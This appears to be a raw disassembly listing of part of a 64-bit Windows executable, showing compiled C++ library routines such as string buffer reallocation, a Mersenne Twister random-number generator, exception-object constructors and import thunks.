   140006064:	75 09                	jne    0x14000606f
   140006066:	80 7b 71 00          	cmpb   $0x0,0x71(%rbx)
   14000606a:	0f 94 c0             	sete   %al
   14000606d:	eb ad                	jmp    0x14000601c
   14000606f:	32 c0                	xor    %al,%al
   140006071:	eb a9                	jmp    0x14000601c
   140006073:	b0 01                	mov    $0x1,%al
   140006075:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
   14000607a:	48 33 cc             	xor    %rsp,%rcx
   14000607d:	e8 be 07 00 00       	call   0x140006840
   140006082:	48 83 c4 60          	add    $0x60,%rsp
   140006086:	5b                   	pop    %rbx
   140006087:	c3                   	ret
   140006088:	cc                   	int3
   140006089:	cc                   	int3
   14000608a:	cc                   	int3
   14000608b:	cc                   	int3
   14000608c:	cc                   	int3
   14000608d:	cc                   	int3
   14000608e:	cc                   	int3
   14000608f:	cc                   	int3
   140006090:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140006095:	57                   	push   %rdi
   140006096:	48 83 ec 20          	sub    $0x20,%rsp
   14000609a:	48 83 b9 80 00 00 00 	cmpq   $0x0,0x80(%rcx)
   1400060a1:	00 
   1400060a2:	48 8b f9             	mov    %rcx,%rdi
   1400060a5:	74 5e                	je     0x140006105
   1400060a7:	4c 8b 41 18          	mov    0x18(%rcx),%r8
   1400060ab:	48 8d 41 70          	lea    0x70(%rcx),%rax
   1400060af:	48 89 5c 24 38       	mov    %rbx,0x38(%rsp)
   1400060b4:	49 39 00             	cmp    %rax,(%r8)
   1400060b7:	75 20                	jne    0x1400060d9
   1400060b9:	48 8b 91 90 00 00 00 	mov    0x90(%rcx),%rdx
   1400060c0:	48 8b 89 88 00 00 00 	mov    0x88(%rcx),%rcx
   1400060c7:	49 89 08             	mov    %rcx,(%r8)
   1400060ca:	2b d1                	sub    %ecx,%edx
   1400060cc:	48 8b 47 38          	mov    0x38(%rdi),%rax
   1400060d0:	48 89 08             	mov    %rcx,(%rax)
   1400060d3:	48 8b 47 50          	mov    0x50(%rdi),%rax
   1400060d7:	89 10                	mov    %edx,(%rax)
   1400060d9:	48 8b cf             	mov    %rdi,%rcx
   1400060dc:	e8 bf fe ff ff       	call   0x140005fa0
   1400060e1:	48 8b 8f 80 00 00 00 	mov    0x80(%rdi),%rcx
   1400060e8:	33 db                	xor    %ebx,%ebx
   1400060ea:	84 c0                	test   %al,%al
   1400060ec:	48 0f 45 df          	cmovne %rdi,%rbx
   1400060f0:	ff 15 82 24 00 00    	call   *0x2482(%rip)        # 0x140008578
   1400060f6:	33 f6                	xor    %esi,%esi
   1400060f8:	85 c0                	test   %eax,%eax
   1400060fa:	48 0f 44 f3          	cmove  %rbx,%rsi
   1400060fe:	48 8b 5c 24 38       	mov    0x38(%rsp),%rbx
   140006103:	eb 02                	jmp    0x140006107
   140006105:	33 f6                	xor    %esi,%esi
   140006107:	48 8b cf             	mov    %rdi,%rcx
   14000610a:	c6 47 7c 00          	movb   $0x0,0x7c(%rdi)
   14000610e:	c6 47 71 00          	movb   $0x0,0x71(%rdi)
   140006112:	ff 15 f8 20 00 00    	call   *0x20f8(%rip)        # 0x140008210
   140006118:	48 8b 0d 61 78 00 00 	mov    0x7861(%rip),%rcx        # 0x14000d980
   14000611f:	48 8b c6             	mov    %rsi,%rax
   140006122:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140006127:	48 89 4f 74          	mov    %rcx,0x74(%rdi)
   14000612b:	48 c7 87 80 00 00 00 	movq   $0x0,0x80(%rdi)
   140006132:	00 00 00 00 
   140006136:	48 c7 47 68 00 00 00 	movq   $0x0,0x68(%rdi)
   14000613d:	00 
   14000613e:	48 83 c4 20          	add    $0x20,%rsp
   140006142:	5f                   	pop    %rdi
   140006143:	c3                   	ret
   140006144:	cc                   	int3
   140006145:	cc                   	int3
   140006146:	cc                   	int3
   140006147:	cc                   	int3
   140006148:	cc                   	int3
   140006149:	cc                   	int3
   14000614a:	cc                   	int3
   14000614b:	cc                   	int3
   14000614c:	cc                   	int3
   14000614d:	cc                   	int3
   14000614e:	cc                   	int3
   14000614f:	cc                   	int3
   140006150:	40 53                	rex push %rbx
   140006152:	48 83 ec 20          	sub    $0x20,%rsp
   140006156:	48 8b d9             	mov    %rcx,%rbx
   140006159:	ff 11                	call   *(%rcx)
   14000615b:	ff 15 7f 20 00 00    	call   *0x207f(%rip)        # 0x1400081e0
   140006161:	ba 08 00 00 00       	mov    $0x8,%edx
   140006166:	48 8b cb             	mov    %rbx,%rcx
   140006169:	e8 f2 06 00 00       	call   0x140006860
   14000616e:	33 c0                	xor    %eax,%eax
   140006170:	48 83 c4 20          	add    $0x20,%rsp
   140006174:	5b                   	pop    %rbx
   140006175:	c3                   	ret
   140006176:	cc                   	int3
   140006177:	cc                   	int3
   140006178:	cc                   	int3
   140006179:	cc                   	int3
   14000617a:	cc                   	int3
   14000617b:	cc                   	int3
   14000617c:	cc                   	int3
   14000617d:	cc                   	int3
   14000617e:	cc                   	int3
   14000617f:	cc                   	int3
   140006180:	40 53                	rex push %rbx
   140006182:	55                   	push   %rbp
   140006183:	56                   	push   %rsi
   140006184:	41 57                	push   %r15
   140006186:	48 83 ec 38          	sub    $0x38,%rsp
   14000618a:	48 8b 69 10          	mov    0x10(%rcx),%rbp
   14000618e:	48 bb ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rbx
   140006195:	ff ff 7f 
   140006198:	48 8b c3             	mov    %rbx,%rax
   14000619b:	45 0f b6 f9          	movzbl %r9b,%r15d
   14000619f:	48 2b c5             	sub    %rbp,%rax
   1400061a2:	48 8b f1             	mov    %rcx,%rsi
   1400061a5:	48 83 f8 01          	cmp    $0x1,%rax
   1400061a9:	0f 82 39 01 00 00    	jb     0x1400062e8
   1400061af:	48 89 7c 24 68       	mov    %rdi,0x68(%rsp)
   1400061b4:	4c 89 64 24 70       	mov    %r12,0x70(%rsp)
   1400061b9:	4c 8d 65 01          	lea    0x1(%rbp),%r12
   1400061bd:	49 8b d4             	mov    %r12,%rdx
   1400061c0:	4c 89 74 24 30       	mov    %r14,0x30(%rsp)
   1400061c5:	4c 8b 71 18          	mov    0x18(%rcx),%r14
   1400061c9:	48 83 ca 0f          	or     $0xf,%rdx
   1400061cd:	48 3b d3             	cmp    %rbx,%rdx
   1400061d0:	77 44                	ja     0x140006216
   1400061d2:	49 8b ce             	mov    %r14,%rcx
   1400061d5:	48 8b c3             	mov    %rbx,%rax
   1400061d8:	48 d1 e9             	shr    $1,%rcx
   1400061db:	48 2b c1             	sub    %rcx,%rax
   1400061de:	4c 3b f0             	cmp    %rax,%r14
   1400061e1:	77 33                	ja     0x140006216
   1400061e3:	49 8d 04 0e          	lea    (%r14,%rcx,1),%rax
   1400061e7:	48 8b da             	mov    %rdx,%rbx
   1400061ea:	48 3b d0             	cmp    %rax,%rdx
   1400061ed:	48 0f 42 d8          	cmovb  %rax,%rbx
   1400061f1:	48 8d 4b 01          	lea    0x1(%rbx),%rcx
   1400061f5:	48 85 c9             	test   %rcx,%rcx
   1400061f8:	75 04                	jne    0x1400061fe
   1400061fa:	33 ff                	xor    %edi,%edi
   1400061fc:	eb 49                	jmp    0x140006247
   1400061fe:	48 81 f9 00 10 00 00 	cmp    $0x1000,%rcx
   140006205:	72 38                	jb     0x14000623f
   140006207:	48 8d 41 27          	lea    0x27(%rcx),%rax
   14000620b:	48 3b c1             	cmp    %rcx,%rax
   14000620e:	0f 86 da 00 00 00    	jbe    0x1400062ee
   140006214:	eb 0e                	jmp    0x140006224
   140006216:	48 b8 00 00 00 00 00 	movabs $0x8000000000000000,%rax
   14000621d:	00 00 80 
   140006220:	48 83 c0 27          	add    $0x27,%rax
   140006224:	48 8b c8             	mov    %rax,%rcx
   140006227:	e8 3c 06 00 00       	call   0x140006868
   14000622c:	48 85 c0             	test   %rax,%rax
   14000622f:	74 6d                	je     0x14000629e
   140006231:	48 8d 78 27          	lea    0x27(%rax),%rdi
   140006235:	48 83 e7 e0          	and    $0xffffffffffffffe0,%rdi
   140006239:	48 89 47 f8          	mov    %rax,-0x8(%rdi)
   14000623d:	eb 08                	jmp    0x140006247
   14000623f:	e8 24 06 00 00       	call   0x140006868
   140006244:	48 8b f8             	mov    %rax,%rdi
   140006247:	4c 89 66 10          	mov    %r12,0x10(%rsi)
   14000624b:	4c 8b c5             	mov    %rbp,%r8
   14000624e:	48 89 5e 18          	mov    %rbx,0x18(%rsi)
   140006252:	48 8b cf             	mov    %rdi,%rcx
   140006255:	49 83 fe 0f          	cmp    $0xf,%r14
   140006259:	76 5d                	jbe    0x1400062b8
   14000625b:	48 8b 1e             	mov    (%rsi),%rbx
   14000625e:	48 8b d3             	mov    %rbx,%rdx
   140006261:	e8 95 15 00 00       	call   0x1400077fb
   140006266:	49 8d 56 01          	lea    0x1(%r14),%rdx
   14000626a:	44 88 3c 2f          	mov    %r15b,(%rdi,%rbp,1)
   14000626e:	c6 44 2f 01 00       	movb   $0x0,0x1(%rdi,%rbp,1)
   140006273:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   14000627a:	72 18                	jb     0x140006294
   14000627c:	48 8b 43 f8          	mov    -0x8(%rbx),%rax
   140006280:	48 83 c2 27          	add    $0x27,%rdx
   140006284:	48 2b d8             	sub    %rax,%rbx
   140006287:	48 83 eb 08          	sub    $0x8,%rbx
   14000628b:	48 83 fb 1f          	cmp    $0x1f,%rbx
   14000628f:	77 0d                	ja     0x14000629e
   140006291:	48 8b d8             	mov    %rax,%rbx
   140006294:	48 8b cb             	mov    %rbx,%rcx
   140006297:	e8 c4 05 00 00       	call   0x140006860
   14000629c:	eb 2b                	jmp    0x1400062c9
   14000629e:	45 33 c9             	xor    %r9d,%r9d
   1400062a1:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   1400062a8:	00 00 
   1400062aa:	45 33 c0             	xor    %r8d,%r8d
   1400062ad:	33 d2                	xor    %edx,%edx
   1400062af:	33 c9                	xor    %ecx,%ecx
   1400062b1:	ff 15 51 22 00 00    	call   *0x2251(%rip)        # 0x140008508
   1400062b7:	cc                   	int3
   1400062b8:	48 8b d6             	mov    %rsi,%rdx
   1400062bb:	e8 3b 15 00 00       	call   0x1400077fb
   1400062c0:	44 88 3c 2f          	mov    %r15b,(%rdi,%rbp,1)
   1400062c4:	c6 44 2f 01 00       	movb   $0x0,0x1(%rdi,%rbp,1)
   1400062c9:	48 89 3e             	mov    %rdi,(%rsi)
   1400062cc:	48 8b c6             	mov    %rsi,%rax
   1400062cf:	4c 8b 64 24 70       	mov    0x70(%rsp),%r12
   1400062d4:	48 8b 7c 24 68       	mov    0x68(%rsp),%rdi
   1400062d9:	4c 8b 74 24 30       	mov    0x30(%rsp),%r14
   1400062de:	48 83 c4 38          	add    $0x38,%rsp
   1400062e2:	41 5f                	pop    %r15
   1400062e4:	5e                   	pop    %rsi
   1400062e5:	5d                   	pop    %rbp
   1400062e6:	5b                   	pop    %rbx
   1400062e7:	c3                   	ret
   1400062e8:	e8 c3 b0 ff ff       	call   0x1400013b0
   1400062ed:	cc                   	int3
   1400062ee:	e8 9d af ff ff       	call   0x140001290
   1400062f3:	cc                   	int3
   1400062f4:	cc                   	int3
   1400062f5:	cc                   	int3
   1400062f6:	cc                   	int3
   1400062f7:	cc                   	int3
   1400062f8:	cc                   	int3
   1400062f9:	cc                   	int3
   1400062fa:	cc                   	int3
   1400062fb:	cc                   	int3
   1400062fc:	cc                   	int3
   1400062fd:	cc                   	int3
   1400062fe:	cc                   	int3
   1400062ff:	cc                   	int3
   140006300:	40 53                	rex push %rbx
   140006302:	55                   	push   %rbp
   140006303:	56                   	push   %rsi
   140006304:	48 83 ec 40          	sub    $0x40,%rsp
   140006308:	48 8b 69 10          	mov    0x10(%rcx),%rbp
   14000630c:	48 bb fe ff ff ff ff 	movabs $0x7ffffffffffffffe,%rbx
   140006313:	ff ff 7f 
   140006316:	48 8b c3             	mov    %rbx,%rax
   140006319:	48 8b f1             	mov    %rcx,%rsi
   14000631c:	48 2b c5             	sub    %rbp,%rax
   14000631f:	48 3b c2             	cmp    %rdx,%rax
   140006322:	0f 82 70 01 00 00    	jb     0x140006498
   140006328:	48 89 7c 24 70       	mov    %rdi,0x70(%rsp)
   14000632d:	4c 89 74 24 38       	mov    %r14,0x38(%rsp)
   140006332:	4c 8b 71 18          	mov    0x18(%rcx),%r14
   140006336:	4c 89 7c 24 30       	mov    %r15,0x30(%rsp)
   14000633b:	4c 8d 3c 2a          	lea    (%rdx,%rbp,1),%r15
   14000633f:	49 8b d7             	mov    %r15,%rdx
   140006342:	48 83 ca 07          	or     $0x7,%rdx
   140006346:	48 3b d3             	cmp    %rbx,%rdx
   140006349:	77 3f                	ja     0x14000638a
   14000634b:	49 8b ce             	mov    %r14,%rcx
   14000634e:	48 8b c3             	mov    %rbx,%rax
   140006351:	48 d1 e9             	shr    $1,%rcx
   140006354:	48 2b c1             	sub    %rcx,%rax
   140006357:	4c 3b f0             	cmp    %rax,%r14
   14000635a:	77 2e                	ja     0x14000638a
   14000635c:	49 8d 04 0e          	lea    (%r14,%rcx,1),%rax
   140006360:	48 8b da             	mov    %rdx,%rbx
   140006363:	48 3b d0             	cmp    %rax,%rdx
   140006366:	48 0f 42 d8          	cmovb  %rax,%rbx
   14000636a:	48 b8 ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rax
   140006371:	ff ff 7f 
   140006374:	48 8d 4b 01          	lea    0x1(%rbx),%rcx
   140006378:	48 3b c8             	cmp    %rax,%rcx
   14000637b:	0f 87 1d 01 00 00    	ja     0x14000649e
   140006381:	48 03 c9             	add    %rcx,%rcx
   140006384:	75 12                	jne    0x140006398
   140006386:	33 ff                	xor    %edi,%edi
   140006388:	eb 4b                	jmp    0x1400063d5
   14000638a:	48 b8 ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rax
   140006391:	ff ff 7f 
   140006394:	48 8d 0c 00          	lea    (%rax,%rax,1),%rcx
   140006398:	48 81 f9 00 10 00 00 	cmp    $0x1000,%rcx
   14000639f:	72 2c                	jb     0x1400063cd
   1400063a1:	48 8d 41 27          	lea    0x27(%rcx),%rax
   1400063a5:	48 3b c1             	cmp    %rcx,%rax
   1400063a8:	0f 86 f0 00 00 00    	jbe    0x14000649e
   1400063ae:	48 8b c8             	mov    %rax,%rcx
   1400063b1:	e8 b2 04 00 00       	call   0x140006868
   1400063b6:	48 85 c0             	test   %rax,%rax
   1400063b9:	0f 84 8f 00 00 00    	je     0x14000644e
   1400063bf:	48 8d 78 27          	lea    0x27(%rax),%rdi
   1400063c3:	48 83 e7 e0          	and    $0xffffffffffffffe0,%rdi
   1400063c7:	48 89 47 f8          	mov    %rax,-0x8(%rdi)
   1400063cb:	eb 08                	jmp    0x1400063d5
   1400063cd:	e8 96 04 00 00       	call   0x140006868
   1400063d2:	48 8b f8             	mov    %rax,%rdi
   1400063d5:	48 8b 84 24 88 00 00 	mov    0x88(%rsp),%rax
   1400063dc:	00 
   1400063dd:	48 8d 2c 6d 02 00 00 	lea    0x2(,%rbp,2),%rbp
   1400063e4:	00 
   1400063e5:	4c 89 7e 10          	mov    %r15,0x10(%rsi)
   1400063e9:	48 8d 15 10 28 00 00 	lea    0x2810(%rip),%rdx        # 0x140008c00
   1400063f0:	48 89 5e 18          	mov    %rbx,0x18(%rsi)
   1400063f4:	48 8b cf             	mov    %rdi,%rcx
   1400063f7:	4c 8d 04 00          	lea    (%rax,%rax,1),%r8
   1400063fb:	4d 8d 3c 38          	lea    (%r8,%rdi,1),%r15
   1400063ff:	49 83 fe 07          	cmp    $0x7,%r14
   140006403:	76 63                	jbe    0x140006468
   140006405:	48 8b 1e             	mov    (%rsi),%rbx
   140006408:	e8 ee 13 00 00       	call   0x1400077fb
   14000640d:	4c 8b c5             	mov    %rbp,%r8
   140006410:	48 8b d3             	mov    %rbx,%rdx
   140006413:	49 8b cf             	mov    %r15,%rcx
   140006416:	e8 e0 13 00 00       	call   0x1400077fb
   14000641b:	4a 8d 14 75 02 00 00 	lea    0x2(,%r14,2),%rdx
   140006422:	00 
   140006423:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   14000642a:	72 18                	jb     0x140006444
   14000642c:	48 8b 43 f8          	mov    -0x8(%rbx),%rax
   140006430:	48 83 c2 27          	add    $0x27,%rdx
   140006434:	48 2b d8             	sub    %rax,%rbx
   140006437:	48 83 eb 08          	sub    $0x8,%rbx
   14000643b:	48 83 fb 1f          	cmp    $0x1f,%rbx
   14000643f:	77 0d                	ja     0x14000644e
   140006441:	48 8b d8             	mov    %rax,%rbx
   140006444:	48 8b cb             	mov    %rbx,%rcx
   140006447:	e8 14 04 00 00       	call   0x140006860
   14000644c:	eb 2d                	jmp    0x14000647b
   14000644e:	45 33 c9             	xor    %r9d,%r9d
   140006451:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140006458:	00 00 
   14000645a:	45 33 c0             	xor    %r8d,%r8d
   14000645d:	33 d2                	xor    %edx,%edx
   14000645f:	33 c9                	xor    %ecx,%ecx
   140006461:	ff 15 a1 20 00 00    	call   *0x20a1(%rip)        # 0x140008508
   140006467:	cc                   	int3
   140006468:	e8 8e 13 00 00       	call   0x1400077fb
   14000646d:	4c 8b c5             	mov    %rbp,%r8
   140006470:	48 8b d6             	mov    %rsi,%rdx
   140006473:	49 8b cf             	mov    %r15,%rcx
   140006476:	e8 80 13 00 00       	call   0x1400077fb
   14000647b:	48 89 3e             	mov    %rdi,(%rsi)
   14000647e:	48 8b c6             	mov    %rsi,%rax
   140006481:	4c 8b 74 24 38       	mov    0x38(%rsp),%r14
   140006486:	48 8b 7c 24 70       	mov    0x70(%rsp),%rdi
   14000648b:	4c 8b 7c 24 30       	mov    0x30(%rsp),%r15
   140006490:	48 83 c4 40          	add    $0x40,%rsp
   140006494:	5e                   	pop    %rsi
   140006495:	5d                   	pop    %rbp
   140006496:	5b                   	pop    %rbx
   140006497:	c3                   	ret
   140006498:	e8 13 af ff ff       	call   0x1400013b0
   14000649d:	cc                   	int3
   14000649e:	e8 ed ad ff ff       	call   0x140001290
   1400064a3:	cc                   	int3
   1400064a4:	cc                   	int3
   1400064a5:	cc                   	int3
   1400064a6:	cc                   	int3
   1400064a7:	cc                   	int3
   1400064a8:	cc                   	int3
   1400064a9:	cc                   	int3
   1400064aa:	cc                   	int3
   1400064ab:	cc                   	int3
   1400064ac:	cc                   	int3
   1400064ad:	cc                   	int3
   1400064ae:	cc                   	int3
   1400064af:	cc                   	int3
   1400064b0:	8b 11                	mov    (%rcx),%edx
   1400064b2:	41 ba 70 02 00 00    	mov    $0x270,%r10d
   1400064b8:	4c 8b c9             	mov    %rcx,%r9
   1400064bb:	41 3b d2             	cmp    %r10d,%edx
   1400064be:	75 51                	jne    0x140006511
   1400064c0:	4c 8d 41 08          	lea    0x8(%rcx),%r8
   1400064c4:	0f 1f 40 00          	nopl   0x0(%rax)
   1400064c8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   1400064cf:	00 
   1400064d0:	41 8b 50 fc          	mov    -0x4(%r8),%edx
   1400064d4:	41 33 10             	xor    (%r8),%edx
   1400064d7:	4d 8d 40 04          	lea    0x4(%r8),%r8
   1400064db:	0f ba f2 1f          	btr    $0x1f,%edx
   1400064df:	41 33 50 f8          	xor    -0x8(%r8),%edx
   1400064e3:	8b c2                	mov    %edx,%eax
   1400064e5:	24 01                	and    $0x1,%al
   1400064e7:	f6 d8                	neg    %al
   1400064e9:	1b c9                	sbb    %ecx,%ecx
   1400064eb:	d1 ea                	shr    $1,%edx
   1400064ed:	81 e1 df b0 08 99    	and    $0x9908b0df,%ecx
   1400064f3:	41 33 88 2c 06 00 00 	xor    0x62c(%r8),%ecx
   1400064fa:	33 ca                	xor    %edx,%ecx
   1400064fc:	41 89 88 b8 09 00 00 	mov    %ecx,0x9b8(%r8)
   140006503:	49 83 ea 01          	sub    $0x1,%r10
   140006507:	75 c7                	jne    0x1400064d0
   140006509:	41 8b 11             	mov    (%r9),%edx
   14000650c:	e9 e0 00 00 00       	jmp    0x1400065f1
   140006511:	81 fa e0 04 00 00    	cmp    $0x4e0,%edx
   140006517:	0f 82 d4 00 00 00    	jb     0x1400065f1
   14000651d:	4c 8d 81 c8 09 00 00 	lea    0x9c8(%rcx),%r8
   140006524:	41 ba e3 00 00 00    	mov    $0xe3,%r10d
   14000652a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140006530:	41 8b 50 fc          	mov    -0x4(%r8),%edx
   140006534:	41 33 10             	xor    (%r8),%edx
   140006537:	4d 8d 40 04          	lea    0x4(%r8),%r8
   14000653b:	0f ba f2 1f          	btr    $0x1f,%edx
   14000653f:	41 33 50 f8          	xor    -0x8(%r8),%edx
   140006543:	8b c2                	mov    %edx,%eax
   140006545:	24 01                	and    $0x1,%al
   140006547:	f6 d8                	neg    %al
   140006549:	1b c9                	sbb    %ecx,%ecx
   14000654b:	d1 ea                	shr    $1,%edx
   14000654d:	81 e1 df b0 08 99    	and    $0x9908b0df,%ecx
   140006553:	41 33 88 2c 06 00 00 	xor    0x62c(%r8),%ecx
   14000655a:	33 ca                	xor    %edx,%ecx
   14000655c:	41 89 88 38 f6 ff ff 	mov    %ecx,-0x9c8(%r8)
   140006563:	49 83 ea 01          	sub    $0x1,%r10
   140006567:	75 c7                	jne    0x140006530
   140006569:	4d 8d 81 54 0d 00 00 	lea    0xd54(%r9),%r8
   140006570:	41 ba 8c 01 00 00    	mov    $0x18c,%r10d
   140006576:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000657d:	00 00 00 
   140006580:	41 8b 50 fc          	mov    -0x4(%r8),%edx
   140006584:	41 33 10             	xor    (%r8),%edx
   140006587:	4d 8d 40 04          	lea    0x4(%r8),%r8
   14000658b:	0f ba f2 1f          	btr    $0x1f,%edx
   14000658f:	41 33 50 f8          	xor    -0x8(%r8),%edx
   140006593:	8b c2                	mov    %edx,%eax
   140006595:	24 01                	and    $0x1,%al
   140006597:	f6 d8                	neg    %al
   140006599:	1b c9                	sbb    %ecx,%ecx
   14000659b:	d1 ea                	shr    $1,%edx
   14000659d:	81 e1 df b0 08 99    	and    $0x9908b0df,%ecx
   1400065a3:	41 33 88 ac f2 ff ff 	xor    -0xd54(%r8),%ecx
   1400065aa:	33 ca                	xor    %edx,%ecx
   1400065ac:	41 89 88 38 f6 ff ff 	mov    %ecx,-0x9c8(%r8)
   1400065b3:	49 83 ea 01          	sub    $0x1,%r10
   1400065b7:	75 c7                	jne    0x140006580
   1400065b9:	41 8b 81 80 13 00 00 	mov    0x1380(%r9),%eax
   1400065c0:	8b d0                	mov    %eax,%edx
   1400065c2:	41 33 51 04          	xor    0x4(%r9),%edx
   1400065c6:	0f ba f2 1f          	btr    $0x1f,%edx
   1400065ca:	33 d0                	xor    %eax,%edx
   1400065cc:	8b c2                	mov    %edx,%eax
   1400065ce:	24 01                	and    $0x1,%al
   1400065d0:	f6 d8                	neg    %al
   1400065d2:	1b c9                	sbb    %ecx,%ecx
   1400065d4:	d1 ea                	shr    $1,%edx
   1400065d6:	81 e1 df b0 08 99    	and    $0x9908b0df,%ecx
   1400065dc:	33 ca                	xor    %edx,%ecx
   1400065de:	41 33 89 34 06 00 00 	xor    0x634(%r9),%ecx
   1400065e5:	33 d2                	xor    %edx,%edx
   1400065e7:	41 89 89 c0 09 00 00 	mov    %ecx,0x9c0(%r9)
   1400065ee:	41 89 11             	mov    %edx,(%r9)
   1400065f1:	8b c2                	mov    %edx,%eax
   1400065f3:	41 8b 4c 81 04       	mov    0x4(%r9,%rax,4),%ecx
   1400065f8:	8d 42 01             	lea    0x1(%rdx),%eax
   1400065fb:	41 89 01             	mov    %eax,(%r9)
   1400065fe:	8b c1                	mov    %ecx,%eax
   140006600:	c1 e8 0b             	shr    $0xb,%eax
   140006603:	41 23 81 84 13 00 00 	and    0x1384(%r9),%eax
   14000660a:	33 c1                	xor    %ecx,%eax
   14000660c:	8b d0                	mov    %eax,%edx
   14000660e:	81 e2 ad 58 3a ff    	and    $0xff3a58ad,%edx
   140006614:	c1 e2 07             	shl    $0x7,%edx
   140006617:	33 d0                	xor    %eax,%edx
   140006619:	8b ca                	mov    %edx,%ecx
   14000661b:	81 e1 8c df ff ff    	and    $0xffffdf8c,%ecx
   140006621:	c1 e1 0f             	shl    $0xf,%ecx
   140006624:	33 ca                	xor    %edx,%ecx
   140006626:	8b c1                	mov    %ecx,%eax
   140006628:	c1 e8 12             	shr    $0x12,%eax
   14000662b:	33 c1                	xor    %ecx,%eax
   14000662d:	c3                   	ret
   14000662e:	cc                   	int3
   14000662f:	cc                   	int3
   140006630:	48 63 41 fc          	movslq -0x4(%rcx),%rax
   140006634:	48 2b c8             	sub    %rax,%rcx
   140006637:	e9 94 f4 ff ff       	jmp    0x140005ad0
   14000663c:	ff 25 56 1b 00 00    	jmp    *0x1b56(%rip)        # 0x140008198
   140006642:	cc                   	int3
   140006643:	cc                   	int3
   140006644:	40 53                	rex push %rbx
   140006646:	48 83 ec 20          	sub    $0x20,%rsp
   14000664a:	48 8b d9             	mov    %rcx,%rbx
   14000664d:	b9 10 00 00 00       	mov    $0x10,%ecx
   140006652:	ff 15 e0 1d 00 00    	call   *0x1de0(%rip)        # 0x140008438
   140006658:	48 8b d0             	mov    %rax,%rdx
   14000665b:	48 85 c0             	test   %rax,%rax
   14000665e:	74 1b                	je     0x14000667b
   140006660:	48 8b 05 19 6d 00 00 	mov    0x6d19(%rip),%rax        # 0x14000d380
   140006667:	48 89 02             	mov    %rax,(%rdx)
   14000666a:	48 89 5a 08          	mov    %rbx,0x8(%rdx)
   14000666e:	48 89 15 0b 6d 00 00 	mov    %rdx,0x6d0b(%rip)        # 0x14000d380
   140006675:	48 83 c4 20          	add    $0x20,%rsp
   140006679:	5b                   	pop    %rbx
   14000667a:	c3                   	ret
   14000667b:	e8 11 00 00 00       	call   0x140006691
   140006680:	cc                   	int3
   140006681:	cc                   	int3
   140006682:	cc                   	int3
   140006683:	cc                   	int3
   140006684:	48 ff 25 5d 1a 00 00 	rex.W jmp *0x1a5d(%rip)        # 0x1400080e8
   14000668b:	ff 25 cf 1a 00 00    	jmp    *0x1acf(%rip)        # 0x140008160
   140006691:	ff 25 91 1a 00 00    	jmp    *0x1a91(%rip)        # 0x140008128
   140006697:	cc                   	int3
   140006698:	cc                   	int3
   140006699:	cc                   	int3
   14000669a:	cc                   	int3
   14000669b:	cc                   	int3
   14000669c:	cc                   	int3
   14000669d:	cc                   	int3
   14000669e:	cc                   	int3
   14000669f:	cc                   	int3
   1400066a0:	48 8b 05 59 69 00 00 	mov    0x6959(%rip),%rax        # 0x14000d000
   1400066a7:	33 d2                	xor    %edx,%edx
   1400066a9:	48 ff 25 68 1f 00 00 	rex.W jmp *0x1f68(%rip)        # 0x140008618
   1400066b0:	40 53                	rex push %rbx
   1400066b2:	48 83 ec 20          	sub    $0x20,%rsp
   1400066b6:	48 8b d9             	mov    %rcx,%rbx
   1400066b9:	48 8d 05 e0 1f 00 00 	lea    0x1fe0(%rip),%rax        # 0x1400086a0
   1400066c0:	48 89 01             	mov    %rax,(%rcx)
   1400066c3:	8b 42 08             	mov    0x8(%rdx),%eax
   1400066c6:	89 41 08             	mov    %eax,0x8(%rcx)
   1400066c9:	48 8b 4a 10          	mov    0x10(%rdx),%rcx
   1400066cd:	48 89 4b 10          	mov    %rcx,0x10(%rbx)
   1400066d1:	48 c7 43 18 00 00 00 	movq   $0x0,0x18(%rbx)
   1400066d8:	00 
   1400066d9:	48 85 c9             	test   %rcx,%rcx
   1400066dc:	74 0d                	je     0x1400066eb
   1400066de:	48 8b 01             	mov    (%rcx),%rax
   1400066e1:	48 8b 40 08          	mov    0x8(%rax),%rax
   1400066e5:	ff 15 2d 1f 00 00    	call   *0x1f2d(%rip)        # 0x140008618
   1400066eb:	48 8b c3             	mov    %rbx,%rax
   1400066ee:	48 83 c4 20          	add    $0x20,%rsp
   1400066f2:	5b                   	pop    %rbx
   1400066f3:	c3                   	ret
   1400066f4:	cc                   	int3
   1400066f5:	cc                   	int3
   1400066f6:	cc                   	int3
   1400066f7:	cc                   	int3
   1400066f8:	cc                   	int3
   1400066f9:	cc                   	int3
   1400066fa:	cc                   	int3
   1400066fb:	cc                   	int3
   1400066fc:	cc                   	int3
   1400066fd:	cc                   	int3
   1400066fe:	cc                   	int3
   1400066ff:	cc                   	int3
   140006700:	40 53                	rex push %rbx
   140006702:	48 83 ec 20          	sub    $0x20,%rsp
   140006706:	48 8b d9             	mov    %rcx,%rbx
   140006709:	48 8d 05 90 1f 00 00 	lea    0x1f90(%rip),%rax        # 0x1400086a0
   140006710:	48 89 01             	mov    %rax,(%rcx)
   140006713:	89 51 08             	mov    %edx,0x8(%rcx)
   140006716:	4c 89 41 10          	mov    %r8,0x10(%rcx)
   14000671a:	48 c7 41 18 00 00 00 	movq   $0x0,0x18(%rcx)
   140006721:	00 
   140006722:	4d 85 c0             	test   %r8,%r8
   140006725:	74 15                	je     0x14000673c
   140006727:	45 84 c9             	test   %r9b,%r9b
   14000672a:	74 10                	je     0x14000673c
   14000672c:	49 8b 00             	mov    (%r8),%rax
   14000672f:	49 8b c8             	mov    %r8,%rcx
   140006732:	48 8b 40 08          	mov    0x8(%rax),%rax
   140006736:	ff 15 dc 1e 00 00    	call   *0x1edc(%rip)        # 0x140008618
   14000673c:	48 8b c3             	mov    %rbx,%rax
   14000673f:	48 83 c4 20          	add    $0x20,%rsp
   140006743:	5b                   	pop    %rbx
   140006744:	c3                   	ret
   140006745:	cc                   	int3
   140006746:	cc                   	int3
   140006747:	cc                   	int3
   140006748:	cc                   	int3
